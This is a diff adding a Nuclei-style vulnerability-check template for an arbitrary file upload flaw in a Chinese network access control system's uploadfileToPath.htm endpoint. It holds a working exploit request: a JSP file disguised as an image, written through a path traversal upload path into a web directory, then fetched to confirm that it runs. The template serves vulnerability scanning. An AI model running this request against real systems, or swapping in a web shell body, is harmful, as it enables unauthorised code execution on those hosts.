@@ -1,0 +1,54 @@
+id: poc-yaml-nacc-uploadfiletopath-htm-anyfile-upload
+info:
+  name: 联软网络准入控制系统 uploadfileToPath.htm 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_text_alphanumeric(4)}}"
+  t2: "{{md5(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /uai/download/uploadfileToPath.htm HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------------------570xxxxxxxxx6025274xxxxxxxx1
+
+        -----------------------------570xxxxxxxxx6025274xxxxxxxx1
+        Content-Disposition: form-data; name="input_localfile"; filename="{{t1}}.jsp"
+        Content-Type: image/png
+
+        <% out.println("{{t2}}");%>
+        -----------------------------570xxxxxxxxx6025274xxxxxxxx1
+        Content-Disposition: form-data; name="uploadpath"
+
+        ../webapps/notifymsg/devreport/
+        -----------------------------570xxxxxxxxx6025274xxxxxxxx1--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "文件上传成功"
+
+  - raw:
+      - |
+        GET /notifymsg/devreport/{{t1}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
